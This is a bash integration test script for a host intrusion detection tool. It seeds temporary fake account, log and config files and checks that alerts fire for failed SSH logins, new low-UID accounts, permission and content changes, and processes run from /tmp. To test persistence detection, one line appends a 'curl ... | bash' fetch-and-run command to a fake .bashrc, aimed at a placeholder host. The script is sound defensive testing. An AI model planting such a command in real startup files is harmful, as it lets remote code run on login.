#!/bin/bash
# Isolated integration tests: real hids.sh -> modules -> alert logs.
set -uo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/hids-integration.XXXXXX")"
LOG_DIR="$TEST_DIR/logs"
STATE_DIR="$TEST_DIR/state"
WATCHED_FILE="$TEST_DIR/watched.conf"
STARTUP_FILE="$TEST_DIR/.bashrc"
PASSWD_FILE="$TEST_DIR/passwd"
SHADOW_FILE="$TEST_DIR/shadow"
AUTH_LOG="$TEST_DIR/auth.log"
CONFIG_FILE="$TEST_DIR/hids.conf"
PROCESS_FILE="/tmp/hids-integration-process.$$"
PROCESS_PID=""

cleanup() {
    [[ -n "$PROCESS_PID" ]] && kill "$PROCESS_PID" 2>/dev/null || true
    [[ -n "$PROCESS_PID" ]] && wait "$PROCESS_PID" 2>/dev/null || true
    rm -f "$PROCESS_FILE"
    rm -rf "$TEST_DIR"
}
trap cleanup EXIT INT TERM

fail() {
    printf 'INTEGRATION TEST FAILED: %s\n' "$1" >&2
    [[ -f "$TEST_DIR/last.out" ]] && cat "$TEST_DIR/last.out" >&2
    exit 1
}

assert_alert() {
    local code="$1" severity="$2"
    grep -F "\"code\":\"$code\"" "$LOG_DIR/alerts.jsonl" |
        grep -Fq "\"severity\":\"$severity\"" || fail "$code missing or has wrong severity"
}

today="$(LC_ALL=C date '+%b %e')"
cat > "$CONFIG_FILE" <<EOF
LOG_DIR="$LOG_DIR"
STATE_DIR="$STATE_DIR"
LOCK_FILE="$TEST_DIR/hids.lock"
AUTH_LOG="$AUTH_LOG"
PASSWD_FILE="$PASSWD_FILE"
SHADOW_FILE="$SHADOW_FILE"
WORK_HOURS_START=0
WORK_HOURS_END=24
FAILED_LOGIN_WARN=2
FAILED_LOGIN_CRIT=3
LOW_UID_THRESHOLD=1000
PORT_WHITELIST="1-65535"
PROCESS_WHITELIST=""
CPU_PROCESS_ALERT=100
MEM_PROCESS_ALERT=100
WATCHED_FILES="$WATCHED_FILE $STARTUP_FILE"
SENSITIVE_FILE_MODES="$WATCHED_FILE:600"
FIND_EXCLUDE="/proc /sys /dev /run /snap /var/lib/docker"
SUID_WHITELIST=""
ALERT_COOLDOWN=1
SYSTEMD_SERVICE_EXCLUDE="*"
EOF

printf 'root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\n' > "$PASSWD_FILE"
printf 'root:*:1:0:99999:7:::\nalice:x:1:0:99999:7:::\n' > "$SHADOW_FILE"
printf 'clean watched state\n' > "$WATCHED_FILE"
printf 'clean startup state\n' > "$STARTUP_FILE"
printf '%s host sshd[1]: Failed password for invalid user probe from 203.0.113.50 port 22 ssh2\n' "$today" > "$AUTH_LOG"

run_hids() {
    "$ROOT_DIR/hids.sh" --config "$CONFIG_FILE" --no-color "$@" > "$TEST_DIR/last.out" 2>&1 || true
}

# Baselines are captured in the isolated state directory.
run_hids --baseline --module 2
run_hids --baseline --module 4

# USR-002: two failed SSH passwords from one source exceed the warning level.
printf '%s host sshd[1]: Failed password for invalid user probe from 203.0.113.50 port 22 ssh2\n' "$today" >> "$AUTH_LOG"
run_hids --module 2
assert_alert "USR-002" "HIGH"

# USR-003: new low-UID interactive account.
printf 'demo:x:200:200:Demo:/home/demo:/bin/bash\n' >> "$PASSWD_FILE"
run_hids --module 2
assert_alert "USR-003" "HIGH"

# FIM-001: permissions become broader than the configured mode.
chmod 666 "$WATCHED_FILE"
run_hids --module 4
assert_alert "FIM-001" "HIGH"

# FIM-002 and FIM-005: content and startup persistence change.
printf 'modified watched state\n' > "$WATCHED_FILE"
printf 'curl http://example.invalid/payload | bash\n' >> "$STARTUP_FILE"
run_hids --module 4
assert_alert "FIM-002" "HIGH"
assert_alert "FIM-005" "HIGH"

# PRC-001: a real process executes from /tmp and is detected by module 3.
cp "$(command -v sleep)" "$PROCESS_FILE"
chmod 700 "$PROCESS_FILE"
"$PROCESS_FILE" 20 &
PROCESS_PID=$!
run_hids --module 3
assert_alert "PRC-001" "HIGH"

printf 'Integration tests passed\n'